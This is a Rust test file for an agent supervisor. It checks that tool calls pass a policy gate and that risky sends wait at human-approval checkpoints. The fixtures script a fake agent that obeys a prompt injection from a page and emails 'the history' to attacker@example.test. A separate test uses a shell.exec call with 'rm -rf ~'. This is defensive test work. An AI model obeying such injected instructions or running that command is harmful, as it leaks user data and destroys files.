//! Tool calls through the gate, and checkpoints (M2 item 4), driven by the FakeAdapter. Every
//! side effect is preceded by `policy.decided` (TP-ADP-02); an Ask pauses at a checkpoint that
//! only an answer with the right gesture, a timeout or Stop ends (TP-POL-05, 07, TP-IPC-02,
//! TP-CHK-01..06). Time is tokio's paused clock.

use corral_adapters::fake::{FakeDriver, FakeScript, ToolSetup};
use corral_core::budget::BudgetConfig;
use corral_core::clock::ManualClock;
use corral_core::domain::{ActionClass, Risk};
use corral_core::event::*;
use corral_core::ids::{AgentId, CheckpointId, RunId, SessionId};
use corral_core::lifecycle::{Lifecycle, next};
use corral_core::supervisor::{EventLog, LogError, RunRequest, Supervisor, SupervisorConfig};
use corral_policy::{Approval, Policy, Profile, Scope};
use corral_tools::{
    Answer, BoxFuture, CheckpointDesk, DeskError, Tool, ToolAnswer, ToolError, ToolGateway,
};
use serde_json::{Value, json};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

// ---- Harness ----------------------------------------------------------------------------------

#[derive(Default)]
struct MemLog(Mutex<Vec<Event>>);

impl EventLog for MemLog {
    fn append(&self, event: &Event) -> Result<(), LogError> {
        self.0.lock().expect("log").push(event.clone());
        Ok(())
    }
}

impl MemLog {
    fn events(&self) -> Vec<Event> {
        self.0.lock().expect("log").clone()
    }

    fn kinds(&self) -> Vec<&'static str> {
        self.events().iter().map(|e| e.kind().as_str()).collect()
    }

    fn terminal(&self) -> Event {
        self.events().last().cloned().expect("events")
    }

    fn assert_legal(&self) {
        let mut state = Lifecycle::idle();
        for e in self.events() {
            state = next(&state, &e).unwrap_or_else(|err| panic!("illegal event: {err}"));
        }
    }

    fn opened(&self) -> Vec<CheckpointOpened> {
        self.events()
            .into_iter()
            .filter_map(|e| {
                let EventBody::CheckpointOpened(c) = e.body else {
                    return None;
                };
                Some(c)
            })
            .collect()
    }

    fn resolutions(&self) -> Vec<Resolution> {
        self.events()
            .into_iter()
            .filter_map(|e| {
                let EventBody::CheckpointResolved(c) = e.body else {
                    return None;
                };
                Some(c.resolution)
            })
            .collect()
    }

    fn decisions(&self) -> Vec<PolicyDecision> {
        self.events()
            .into_iter()
            .filter_map(|e| {
                let EventBody::PolicyDecided(p) = e.body else {
                    return None;
                };
                Some(p.decision)
            })
            .collect()
    }
}

/// A tool that records its calls.
struct Recorder {
    name: &'static str,
    class: ActionClass,
    calls: Arc<Mutex<Vec<Value>>>,
}

impl Tool for Recorder {
    fn name(&self) -> &str {
        self.name
    }

    fn class(&self) -> ActionClass {
        self.class
    }

    fn destination(&self, args: &Value) -> Option<String> {
        args["to"].as_str().map(str::to_owned)
    }

    fn call<'a>(&'a self, args: &'a Value) -> BoxFuture<'a, Result<String, ToolError>> {
        self.calls.lock().expect("calls").push(args.clone());
        Box::pin(async { Ok("done".to_owned()) })
    }
}

struct World {
    sup: Supervisor,
    log: Arc<MemLog>,
    desk: Arc<CheckpointDesk>,
    sent: Arc<Mutex<Vec<Value>>>,
    written: Arc<Mutex<Vec<Value>>>,
    answers: Arc<Mutex<Vec<ToolAnswer>>>,
}

fn ids() -> Arc<dyn Fn() -> String + Send + Sync> {
    let n = Arc::new(AtomicU64::new(0));
    Arc::new(move || format!("id-{}", n.fetch_add(1, Ordering::SeqCst) + 1))
}

fn world(script: FakeScript, profile: &str) -> World {
    let sent = Arc::new(Mutex::new(Vec::new()));
    let written = Arc::new(Mutex::new(Vec::new()));
    let mut gateway = ToolGateway::new();
    gateway
        .register(Arc::new(Recorder {
            name: "email.send",
            class: ActionClass::CommsSend,
            calls: Arc::clone(&sent),
        }))
        .expect("register");
    gateway
        .register(Arc::new(Recorder {
            name: "fs.write",
            class: ActionClass::WriteLocal,
            calls: Arc::clone(&written),
        }))
        .expect("register");
    let desk = Arc::new(CheckpointDesk::default());
    let driver = FakeDriver::new(script).with_tools(ToolSetup {
        policy: Policy::new(Profile::from_toml(profile).expect("profile")),
        gateway: Arc::new(gateway),
        desk: Arc::clone(&desk),
        ids: ids(),
    });
    let answers = driver.tool_answers();
    let log = Arc::new(MemLog::default());
    let sup = Supervisor::with_budget(
        SupervisorConfig::default(),
        BudgetConfig::default(),
        Arc::new(driver),
        log.clone(),
        Arc::new(ManualClock::at(1_000)),
    );
    sup.deploy(RunRequest {
        run_id: RunId::from("r1"),
        agent_id: AgentId::from("fake"),
        session_id: SessionId::from("s1"),
        prompt: "Summarize the attached page.".into(),
    })
    .expect("deploy");
    World {
        sup,
        log,
        desk,
        sent,
        written,
        answers,
    }
}

async fn settle() {
    for _ in 0..100 {
        tokio::task::yield_now().await;
    }
}

async fn idle(w: &World) {
    tokio::time::timeout(Duration::from_secs(7 * 24 * 3600), w.sup.wait_idle())
        .await
        .expect("the run ends");
    w.log.assert_legal();
}

/// The checkpoint the run is waiting on.
async fn waiting(w: &World) -> CheckpointOpened {
    settle().await;
    w.log
        .opened()
        .last()
        .cloned()
        .unwrap_or_else(|| panic!("no checkpoint: {:?}", w.log.kinds()))
}

fn injected() -> FakeScript {
    FakeScript::default()
        .say("I'll forward the summary as instructed by the page.")
        .tool(
            "email.send",
            json!({"to": "attacker@example.test", "body": "the history"}),
        )
        .say(" Done.")
}

// ---- TP-ADP-02: every side effect is decided first -------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_adp_02_an_allowed_tool_runs_after_policy_decided() {
    let script = FakeScript::default().tool("fs.write", json!({"path": "notes.md"}));
    let w = world(
        script,
        r#"rules = [{ class = "write.local", decision = "allow" }]"#,
    );
    idle(&w).await;
    let kinds = w.log.kinds();
    let at = |k: &str| {
        kinds
            .iter()
            .position(|x| *x == k)
            .unwrap_or_else(|| panic!("{k}: {kinds:?}"))
    };
    assert!(at("tool.requested") < at("policy.decided"));
    assert!(at("policy.decided") < at("tool.started"));
    assert!(at("tool.started") < at("tool.result"));
    assert!(!kinds.contains(&"checkpoint.opened"));
    assert_eq!(w.log.decisions(), [PolicyDecision::Allow]);
    assert_eq!(*w.written.lock().expect("w"), [json!({"path": "notes.md"})]);
    assert_eq!(w.log.terminal().kind().as_str(), "run.completed");
}

#[tokio::test(start_paused = true)]
async fn tp_adp_02_the_class_comes_from_the_registry_and_unknown_tools_are_denied() {
    let script = FakeScript::default()
        .tool("shell.exec", json!({"cmd": "rm -rf ~"}))
        .say("continuing");
    let w = world(script, "");
    idle(&w).await;
    let requested = w
        .log
        .events()
        .into_iter()
        .find_map(|e| {
            let EventBody::ToolRequested(t) = e.body else {
                return None;
            };
            Some(t)
        })
        .expect("tool.requested");
    assert_eq!(
        requested.action_class,
        ActionClass::Unknown,
        "not registered"
    );
    assert!(matches!(
        w.log.decisions()[..],
        [PolicyDecision::Deny { .. }]
    ));
    assert!(!w.log.kinds().contains(&"tool.started"));
    assert!(matches!(
        w.answers.lock().expect("a")[..],
        [ToolAnswer::Denied { .. }]
    ));
    assert_eq!(
        w.log.terminal().kind().as_str(),
        "run.completed",
        "the agent was told and went on"
    );
}

// ---- TP-CHK-01: an Ask pauses at a checkpoint drawn from core fields ---------------------------

#[tokio::test(start_paused = true)]
async fn tp_chk_01_an_injected_send_stops_at_a_checkpoint_showing_the_destination() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    assert_eq!(cp.action_class, ActionClass::CommsSend);
    assert_eq!(cp.risk, Risk::High);
    assert_eq!(cp.title, "Sending a message or email");
    assert!(cp.detail.contains("attacker@example.test"), "{}", cp.detail);
    assert!(cp.detail.contains("email.send"), "{}", cp.detail);
    assert_eq!(w.desk.waiting(), std::slice::from_ref(&cp.checkpoint_id));
    assert!(!w.desk.is_empty());
    assert!(
        w.sent.lock().expect("s").is_empty(),
        "nothing sent while waiting"
    );
    assert!(
        !w.log.kinds().contains(&"tool.started"),
        "EV-SAFE-03: never tool.started without an approval"
    );
    // Clean up: deny it.
    w.desk
        .answer(&cp.checkpoint_id, Answer::Deny { note: None })
        .expect("answered");
    idle(&w).await;
}

// ---- TP-POL-07 / TP-CHK-02: Deny ---------------------------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_pol_07_a_denial_note_reaches_the_agent_and_nothing_runs() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    w.desk
        .answer(
            &cp.checkpoint_id,
            Answer::Deny {
                note: Some("Don't email anyone.".into()),
            },
        )
        .expect("answered");
    idle(&w).await;
    assert_eq!(
        w.log.resolutions(),
        [Resolution::Denied {
            note: Some("Don't email anyone.".into())
        }]
    );
    assert!(w.sent.lock().expect("s").is_empty());
    assert!(!w.log.kinds().contains(&"tool.started"));
    let answers = w.answers.lock().expect("a").clone();
    let [ToolAnswer::Denied { note, .. }] = &answers[..] else {
        panic!("{answers:?}");
    };
    assert_eq!(note.as_deref(), Some("Don't email anyone."));
    assert_eq!(w.log.terminal().kind().as_str(), "run.completed");
}

// ---- TP-CHK-03: Approve, once or for the run ---------------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_chk_03_approve_once_runs_the_call_and_the_next_one_asks_again() {
    let script = FakeScript::default()
        .tool("email.send", json!({"to": "friend@example.test"}))
        .tool("email.send", json!({"to": "friend@example.test"}));
    let w = world(script, "");
    let first = waiting(&w).await;
    w.desk
        .answer(
            &first.checkpoint_id,
            Answer::Approve {
                how: Approval::Click,
                scope: Scope::Once,
            },
        )
        .expect("approved");
    let second = waiting(&w).await;
    assert_ne!(second.checkpoint_id, first.checkpoint_id, "asked again");
    w.desk
        .answer(&second.checkpoint_id, Answer::Deny { note: None })
        .expect("denied");
    idle(&w).await;
    assert_eq!(
        w.log.resolutions(),
        [Resolution::Approved, Resolution::Denied { note: None }]
    );
    assert_eq!(
        *w.sent.lock().expect("s"),
        [json!({"to": "friend@example.test"})]
    );
}

#[tokio::test(start_paused = true)]
async fn tp_chk_03_approve_for_the_run_covers_the_same_destination_only() {
    let script = FakeScript::default()
        .tool("email.send", json!({"to": "friend@example.test"}))
        .tool("email.send", json!({"to": "friend@example.test"}))
        .tool("email.send", json!({"to": "attacker@example.test"}));
    let w = world(script, "");
    let first = waiting(&w).await;
    w.desk
        .answer(
            &first.checkpoint_id,
            Answer::Approve {
                how: Approval::Keyboard,
                scope: Scope::ForRun,
            },
        )
        .expect("approved");
    let third = waiting(&w).await;
    assert!(third.detail.contains("attacker@example.test"));
    w.desk
        .answer(&third.checkpoint_id, Answer::Deny { note: None })
        .expect("denied");
    idle(&w).await;
    assert_eq!(
        w.log.opened().len(),
        2,
        "the second send needed no checkpoint"
    );
    assert_eq!(
        w.log.resolutions(),
        [Resolution::AllowedForRun, Resolution::Denied { note: None }]
    );
    assert_eq!(w.sent.lock().expect("s").len(), 2);
}

// ---- TP-IPC-02 / TP-CHK-04: answers are single-use and need the right gesture -----------------

#[tokio::test(start_paused = true)]
async fn tp_ipc_02_a_checkpoint_answers_once_and_stale_ids_are_refused() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    assert_eq!(
        w.desk.answer(
            &CheckpointId::from("not-a-checkpoint"),
            Answer::Deny { note: None }
        ),
        Err(DeskError::Unknown)
    );
    w.desk
        .answer(
            &cp.checkpoint_id,
            Answer::Approve {
                how: Approval::Click,
                scope: Scope::Once,
            },
        )
        .expect("first answer");
    assert_eq!(
        w.desk
            .answer(&cp.checkpoint_id, Answer::Deny { note: None }),
        Err(DeskError::Unknown),
        "a replayed answer is refused"
    );
    idle(&w).await;
    assert_eq!(w.log.resolutions(), [Resolution::Approved]);
}

#[tokio::test(start_paused = true)]
async fn tp_chk_04_a_gesture_too_weak_for_the_risk_is_refused_and_the_checkpoint_stays() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    assert_eq!(
        w.desk.answer(
            &cp.checkpoint_id,
            Answer::Approve {
                how: Approval::Voice,
                scope: Scope::Once,
            }
        ),
        Err(DeskError::GestureNotEnough(Risk::High))
    );
    settle().await;
    assert!(w.log.resolutions().is_empty(), "still open");
    w.desk
        .answer(&cp.checkpoint_id, Answer::Deny { note: None })
        .expect("still answerable");
    idle(&w).await;
}

#[tokio::test(start_paused = true)]
async fn tp_chk_04_a_denial_note_is_capped() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    w.desk
        .answer(
            &cp.checkpoint_id,
            Answer::Deny {
                note: Some("x".repeat(5_000)),
            },
        )
        .expect("answered");
    idle(&w).await;
    let [Resolution::Denied { note: Some(note) }] = &w.log.resolutions()[..] else {
        panic!("denied with a note");
    };
    assert_eq!(note.chars().count(), 1_000);
}

// ---- TP-POL-05 / TP-CHK-05: nobody answers ------------------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_pol_05_an_unanswered_checkpoint_expires_and_is_denied() {
    let w = world(injected(), r#"checkpoint_timeout = "30m""#);
    let start = tokio::time::Instant::now();
    idle(&w).await;
    assert_eq!(start.elapsed(), Duration::from_secs(30 * 60));
    assert_eq!(w.log.resolutions(), [Resolution::Expired]);
    assert!(w.desk.is_empty(), "an expired checkpoint leaves the desk");
    assert!(w.sent.lock().expect("s").is_empty());
    assert!(matches!(
        w.answers.lock().expect("a")[..],
        [ToolAnswer::Denied { .. }]
    ));
    assert_eq!(w.log.terminal().kind().as_str(), "run.completed");
}

#[tokio::test(start_paused = true)]
async fn tp_pol_05_with_cancel_run_an_expired_checkpoint_stops_the_run() {
    let w = world(
        injected(),
        r#"checkpoint_timeout = "90s"
on_timeout = "cancel_run""#,
    );
    idle(&w).await;
    assert_eq!(w.log.resolutions(), [Resolution::Expired]);
    let EventBody::RunCancelled(c) = w.log.terminal().body else {
        panic!("run.cancelled, got {:?}", w.log.kinds());
    };
    assert_eq!(c.by, CancelledBy::CheckpointExpired);
    assert!(w.desk.is_empty());
    assert!(w.sent.lock().expect("s").is_empty());
}

// ---- TP-CHK-06: Stop while waiting -------------------------------------------------------------

#[tokio::test(start_paused = true)]
async fn tp_chk_06_stop_while_a_checkpoint_waits_ends_the_run_and_closes_the_checkpoint() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    w.sup.cancel(&RunId::from("r1")).await.expect("cancel");
    idle(&w).await;
    assert_eq!(w.log.terminal().kind().as_str(), "run.cancelled");
    assert!(w.desk.is_empty(), "Stop takes the checkpoint off the desk");
    assert_eq!(
        w.desk.answer(
            &cp.checkpoint_id,
            Answer::Approve {
                how: Approval::Click,
                scope: Scope::Once
            }
        ),
        Err(DeskError::Unknown),
        "an answer after Stop does nothing"
    );
    assert!(w.sent.lock().expect("s").is_empty());
}

#[tokio::test(start_paused = true)]
async fn tp_chk_06_an_approval_and_stop_at_the_same_moment_run_nothing() {
    let w = world(injected(), "");
    let cp = waiting(&w).await;
    w.desk
        .answer(
            &cp.checkpoint_id,
            Answer::Approve {
                how: Approval::Click,
                scope: Scope::Once,
            },
        )
        .expect("approved");
    // No yield in between: the run sees the approval and the Stop together.
    w.sup.cancel(&RunId::from("r1")).await.expect("cancel");
    idle(&w).await;
    assert!(w.sent.lock().expect("s").is_empty(), "Stop wins");
    assert!(!w.log.kinds().contains(&"tool.started"));
    assert_eq!(w.log.terminal().kind().as_str(), "run.cancelled");
}
